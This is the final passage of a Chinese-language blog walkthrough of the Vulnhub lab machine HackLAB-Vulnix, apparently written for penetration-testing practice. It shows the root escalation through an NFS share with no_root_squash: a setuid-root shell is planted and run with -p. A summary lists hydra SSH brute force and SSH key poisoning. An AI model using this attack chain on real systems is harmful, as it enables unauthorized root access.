+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/mnt/vulnix<span class="comment"># cat local_shell &gt; spawn_root_shell</span></span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># ls</span></span><br><span class="line">local_shell  spawn_root_shell</span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># chmod 4777 *</span></span><br><span class="line">root@kali:/mnt/vulnix<span class="comment"># ls -la</span></span><br><span class="line">总用量 1828</span><br><span class="line">drwxr-x--- 4 vulnix vulnix   4096 4月  16 02:33 .</span><br><span class="line">drwxr-xr-x 3 root   root     4096 4月  15 23:00 ..</span><br><span class="line">-rw------- 1 vulnix vulnix      0 4月  16 02:27 .bash_history</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    220 4月   3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix   3486 4月   3  2012 .bashrc</span><br><span class="line">drwx------ 2 vulnix vulnix   4096 4月  15 23:23 .cache</span><br><span class="line">-rwsrwxrwx 1 vulnix vulnix 920788 4月  16 02:24 local_shell</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    675 4月   3  2012 .profile</span><br><span class="line">-rwsrwxrwx 1 root   root   920788 4月  16 02:33 spawn_root_shell</span><br><span class="line">drwxr-xr-x 2 vulnix vulnix   4096 4月  15 23:21 .ssh</span><br></pre></td></tr></table></figure>
+
+<p>然后在受害人的机器上执行shell，并保留带有flag -p的原始文件的权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">vulnix@vulnix:~$ <span class="built_in">ls</span> -la</span><br><span class="line">total 1828</span><br><span class="line">drwxr-x--- 4 vulnix vulnix   4096 Apr 16 07:33 .</span><br><span class="line">drwxr-xr-x 4 root   root     4096 Sep  2  2012 ..</span><br><span class="line">-rw------- 1 vulnix vulnix      0 Apr 16 07:27 .bash_history</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    220 Apr  3  2012 .bash_logout</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix   3486 Apr  3  2012 .bashrc</span><br><span class="line">drwx------ 2 vulnix vulnix   4096 Apr 16 04:23 .cache</span><br><span class="line">-rwsrwxrwx 1 vulnix vulnix 920788 Apr 16 07:24 local_shell</span><br><span class="line">-rw-r--r-- 1 vulnix vulnix    675 Apr  3  2012 .profile</span><br><span class="line">-rwsrwxrwx 1 root   root   920788 Apr 16 07:33 spawn_root_shell</span><br><span class="line">drwxr-xr-x 2 vulnix vulnix   4096 Apr 16 04:21 .ssh</span><br><span class="line">vulnix@vulnix:~$ ./spawn_root_shell -p</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># id</span></span><br><span class="line">uid=2008(vulnix) gid=2008(vulnix) euid=0(root) <span class="built_in">groups</span>=0(root),2008(vulnix)</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># cd /root</span></span><br><span class="line">spawn_root_shell-4.2<span class="comment"># ls</span></span><br><span class="line">trophy.txt</span><br><span class="line">spawn_root_shell-4.2<span class="comment"># cat trophy.txt</span></span><br><span class="line">cc614640424f5bd60ce5d5264899c3be</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub257.jpg"></li>
+</ul>
+<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
+<li>通过telnet连接收集用户名敏感信息</li>
+<li>finger查看用户登录信息</li>
+<li>使用rpcinfo进行RPC枚举</li>
+<li>使用showmount进行NFS枚举</li>
+<li>hydra爆破ssh密码</li>
+<li>ssh key毒化攻击getshell</li>
+<li>特定linux UID权限用户登录挂载的NFS分区</li>
+<li>使用ssh私匙登录ssh</li>
+<li>用no_root_squash替换root_squash以停用安全功能，从而允许客户端的root权限操作最终使文件以root身份出现在导出的文件系统中（在其余客户端中）</li>
+<li>客户端本地以root身份运行cat命令拷贝shell文件，并chmod 4777赋予权限，最后执行shell文件加上-p参数提权</li>
+</ul>
+<p><font color="red">Game over</font></p>
+<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
+<p><font color="green"><em><strong>The end,to be continue…</strong></em></font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/04/15/HackLAB-Vulnix/" title="vulnhub靶机渗透[HackLAB-Vulnix]">https://fdlucifer.github.io/2020/04/15/HackLAB-Vulnix/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/04/14/sunset-1/" rel="prev" title="vulnhub靶机渗透[sunset-1]">
+                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[sunset-1]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/04/16/vulnos-1/" rel="next" title="vulnhub靶机渗透[vulnos-1]">
+                  vulnhub靶机渗透[vulnos-1] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
